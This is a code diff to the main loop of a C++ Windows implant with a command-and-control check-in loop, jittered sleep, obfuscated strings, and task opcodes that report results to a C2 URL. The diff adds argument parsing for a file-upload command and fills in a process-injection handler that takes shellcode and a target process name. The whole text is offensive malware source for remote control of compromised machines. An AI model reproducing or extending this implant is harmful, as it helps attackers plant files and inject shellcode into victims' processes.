@@ -57,12 +57,11 @@ int main()
 
 	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());
 
-	// // do stuff with the response
+	// do stuff with the response
 	Sleep(1);
 
-	PSIZE_T outSize = 0;
 
-	// // Checkin loop
+	// Checkin loop
 	while (TRUE)
 	{
 		float sleeptime = currentProfile->sleep + (currentProfile->sleep * currentProfile->jitter);
@@ -116,11 +115,19 @@ int main()
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
 		else if (opcode == OPCODE_UPLOAD) {
-			std::string result = Upload(newTask->args);
+			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
+			std::string fileName = arr[0].GetString();
+			std::string b64content = arr[1].GetString();
+			std::string result = Upload(fileName, b64content);
 			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
 		}
 		else if (opcode == OPCODE_INJECT) {
-		
+			rapidjson::GenericArray<false, rapidjson::Value> arr = newTask->args->GetArray();
+			std::string shellcode = arr[0].GetString();
+			std::string processName = arr[1].GetString();
+			std::string result = Inject(shellcode, processName);
+			SendTaskResult(newTask->taskId.c_str(), C2_URL, result, result != OBFUSCATED("ERROR"), currentProfile);
+
 		}
 	}
 }
